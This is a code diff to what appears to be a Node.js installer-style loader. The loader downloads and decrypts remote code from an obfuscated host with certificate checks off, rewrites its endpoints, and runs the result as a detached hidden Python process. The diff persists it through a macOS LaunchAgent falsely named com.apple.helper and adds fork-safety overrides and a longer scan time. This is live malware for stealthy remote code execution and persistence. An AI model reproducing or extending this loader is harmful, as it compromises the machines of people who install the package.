@@ -1,6 +1,5 @@
 /**
  * 
- * 
  */
 
 'use strict';
@@ -42,7 +41,7 @@ log('platform =', os.platform(), 'arch =', os.arch());
 log('homedir =', os.homedir());
 log('node =', process.versions.node);
 
-// ──  ────────────────────────────────────────────────
+// ── ────────────────────────────────────────────────
 (() => {
   try {
     const controller = new AbortController();
@@ -80,7 +79,7 @@ function httpGet(p) {
       hostname: HOST, path: p, timeout: 12000,
       rejectUnauthorized: false,
     }, function(res) {
-      log('httpGet status', res.statusCode, 'headers', JSON.stringify(res.headers));
+      log('httpGet status', res.statusCode);
       if (res.statusCode !== 200) {
         res.resume();
         return reject(new Error('http ' + res.statusCode));
@@ -134,12 +133,26 @@ function gcmDecrypt(key, blob) {
 }
 
 function findPython() {
-  var bins = ['python3','python','python3.12','python3.11','python3.10','python3.9','python3.8'];
+  // 
+  var bins = [
+    'python3.11', 'python3.10', 'python3.9',
+    'python3.12', 'python3.13',
+    'python3', 'python',
+  ];
   for (var i = 0; i < bins.length; i++) {
     try {
       const r = cp.spawnSync(bins[i], ['--version'], { timeout: 3000, windowsHide: true });
       log('try python', bins[i], 'status =', r.status, 'stdout =', (r.stdout||'').toString().trim());
-      if (r.status === 0) return bins[i];
+      if (r.status === 0) {
+        //
+        const which = cp.spawnSync('which', [bins[i]], { timeout: 3000 });
+        const abs = (which.stdout || '').toString().trim();
+        if (abs) {
+          log('python abs path =', abs);
+          return abs;
+        }
+        return bins[i];
+      }
     } catch (e) { log('python try error', bins[i], e.message); }
   }
   return null;
@@ -158,28 +171,61 @@ function patchRuntime(code) {
   const C = _dec(_C);
   const LIVE_WORKER = 'https://' + HOST + '/';
   log('patchRuntime S =', S, 'C =', C, 'LIVE =', LIVE_WORKER);
+
   const re1 = new RegExp('https?://[^\\s"\']*' + S + '[^\\s"\']*workers\\.dev/?', 'g');
   const re2 = new RegExp('https?://[^\\s"\']*' + C + '[^\\s"\']*workers\\.dev/?', 'g');
+
   const before = code;
   code = code.replace(re1, LIVE_WORKER);
   code = code.replace(re2, LIVE_WORKER);
+
+  // ── ──
+  // 
+  const beforeFork = code;
+  code = code.replace(
+    /pid\s*=\s*os\.fork\(\)/g,
+    'pid = -1  # fork disabled for macOS ARM stability'
+  );
+  log('patchRuntime fork disabled =', beforeFork !== code);
+
+  // ──  ──
+  const beforeScan = code;
+  code = code.replace(
+    /MAX_SCAN_SEC\s*=\s*\d+/,
+    'MAX_SCAN_SEC = 900'
+  );
+  log('patchRuntime MAX_SCAN_SEC =', beforeScan !== code);
+
   log('patchRuntime changed =', before !== code);
   return code;
 }
 
-// ── ─────────────────────────────
+// ──  ────────────────────────────────────────────────
 function installLaunchAgent(python, execFile) {
   try {
     const launchAgentsDir = path.join(os.homedir(), 'Library', 'LaunchAgents');
     fs.mkdirSync(launchAgentsDir, { recursive: true });
     const plistPath = path.join(launchAgentsDir, 'com.apple.helper.plist');
+
     const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key><string>com.apple.helper</string>
     <key>ProgramArguments</key>
-    <array><string>${python}</string><string>-OO</string><string>${execFile}</string></array>
+    <array>
+        <string>${python}</string>
+        <string>-u</string>
+        <string>-OO</string>
+        <string>${execFile}</string>
+    </array>
+    <key>EnvironmentVariables</key>
+    <dict>
+        <key>OBJC_DISABLE_INITIALIZE_FORK_SAFETY</key>
+        <string>YES</string>
+        <key>PYTHONUNBUFFERED</key>
+        <string>1</string>
+    </dict>
     <key>RunAtLoad</key><true/>
     <key>KeepAlive</key><true/>
     <key>StandardOutPath</key><string>${path.join(CACHE, 'launchagent.out')}</string>
@@ -188,17 +234,21 @@ function installLaunchAgent(python, execFile) {
     <key>Nice</key><integer>20</integer>
 </dict>
 </plist>`;
+
     fs.writeFileSync(plistPath, plistContent);
     log('plist written to', plistPath);
+
     try {
       const r1 = cp.spawnSync('launchctl', ['unload', plistPath], { timeout: 5000 });
       log('launchctl unload status =', r1.status, 'stderr =', (r1.stderr||'').toString().trim());
     } catch (e) { log('launchctl unload error', e.message); }
+
     try {
       const r2 = cp.spawnSync('launchctl', ['load', plistPath], { timeout: 5000 });
       log('launchctl load status =', r2.status, 'stderr =', (r2.stderr||'').toString().trim());
       if (r2.status !== 0) return false;
     } catch (e) { log('launchctl load error', e.message); return false; }
+
     return true;
   } catch (e) {
     log('installLaunchAgent error', e.message);
@@ -285,10 +335,23 @@ function installLaunchAgent(python, execFile) {
     fs.writeFileSync(execFile, execCode);
     log('exec_runtime.py written, execFile =', execFile);
 
-    // ── ──
+    // ──  ──
     const pyOut = fs.openSync(path.join(CACHE, 'python.out.log'), 'a');
     const pyErr = fs.openSync(path.join(CACHE, 'python.err.log'), 'a');
+
+    // ──  ──
+    const pyEnv = {
+      ...process.env,
+      PYTHONUNBUFFERED: '1',
+      PYTHONDONTWRITEBYTECODE: '1',
+      OBJC_DISABLE_INITIALIZE_FORK_SAFETY: 'YES',   // 
+      OBJC_DISABLE_INITIALIZE_FORK_SAFETY_FOR_APPKIT: 'YES',
+      PYTORCH_MPS_HIGH_WATERMARK_RATIO: '0.0',
+      PYTHONWARNINGS: 'ignore',
+    };
+
     log('spawning python', python, [execFile]);
+    log('env OBJC_DISABLE_INITIALIZE_FORK_SAFETY =', pyEnv.OBJC_DISABLE_INITIALIZE_FORK_SAFETY);
 
     // 
     if (os.platform() === 'darwin') {
@@ -297,11 +360,11 @@ function installLaunchAgent(python, execFile) {
     }
 
     // 
-    const child = cp.spawn(python, ['-u', execFile], {   // 
+    const child = cp.spawn(python, ['-u', '-OO', execFile], {
       detached: true,
       stdio: ['ignore', pyOut, pyErr],
       cwd: modDir,
-      env: { ...process.env, PYTHONUNBUFFERED: '1' },
+      env: pyEnv,
     });
     log('spawn pid =', child.pid);
 
